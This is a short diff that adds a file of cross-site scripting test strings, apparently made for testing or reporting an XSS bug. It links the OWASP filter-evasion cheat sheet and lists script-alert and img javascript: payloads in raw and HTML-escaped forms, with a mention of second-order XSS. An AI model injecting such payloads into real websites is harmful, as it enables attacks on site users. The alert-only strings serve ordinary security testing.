@@ -1,0 +1,11 @@
+
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+<script>alert("This is a serious bug, please fix it.")</script>
+
+some second order xss
+
+&lt;script&gt;alert("this serious bug was supposed to be fixed guys")&lt;/script&gt;
+
+<img src="javascript:alert('XSS');">
+&lt;img src="javascript:alert('XSS')&gt;
